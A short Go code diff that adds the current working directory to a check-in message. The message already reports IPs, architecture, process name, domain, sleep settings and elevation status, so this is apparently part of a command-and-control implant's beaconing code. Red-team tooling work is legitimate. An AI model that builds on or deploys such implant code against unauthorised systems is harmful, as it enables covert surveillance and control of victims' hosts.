@@ -353,6 +353,7 @@ func CreateCheckinMessage() structs.CheckInMessage {
 	arch := functions.GetArchitecture()
 	processName := functions.GetProcessName()
 	domain := functions.GetDomain()
+	Cwd := functions.GetCwd()
 	checkin := structs.CheckInMessage{
 		Action:       "checkin",
 		IPs:          currIP,
@@ -365,6 +366,7 @@ func CreateCheckinMessage() structs.CheckInMessage {
 		Domain:       domain,
 		ProcessName:  processName,
 		SleepInfo:    GetSleepString(),
+		Cwd:          Cwd,
 	}
 
 	if functions.IsElevated() {
